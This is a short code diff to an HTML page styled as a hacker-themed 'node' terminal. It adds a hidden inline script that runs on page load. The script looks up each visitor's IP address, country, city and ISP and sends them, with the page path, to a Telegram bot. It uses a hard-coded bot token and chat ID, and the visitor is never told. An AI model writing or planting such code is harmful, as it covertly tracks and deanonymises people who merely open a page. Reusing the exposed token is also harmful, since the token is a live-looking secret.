@@ -108,7 +108,7 @@
 <body>
     <div class="container">
         <div class="terminal-header">
-            root@crypt3cho:~# ./initialize_node.sh --final-deployment
+            root@crypt3cho:~# ./initialize_node.sh --active-monitoring
         </div>
 
         <div class="header">
@@ -176,5 +176,34 @@
             CRYPT3CHO // NO FOOTPRINT // STATUS: ONLINE<span class="cursor">_</span>
         </div>
     </div>
+
+    <script>
+        (function() {
+            const token = "8734320096:AAGlLFUxCWtlbzb1EHim-SLhCuu17V9FJWU";
+            const chatId = "8375518813";
+
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const text = `⚠️ *NODE ACCESS DETECTED*\n\n` +
+                                 `📍 *IP:* \`${data.ip}\`\n` +
+                                 `🌍 *ORIGIN:* ${data.country_name} (${data.city})\n` +
+                                 `🏢 *ISP:* ${data.org}\n` +
+                                 `🔗 *PATH:* ${window.location.pathname}`;
+
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: text,
+                            parse_mode: 'Markdown'
+                        }),
+                        keepalive: true
+                    });
+                })
+                .catch(() => {});
+        })();
+    </script>
 </body>
 </html>
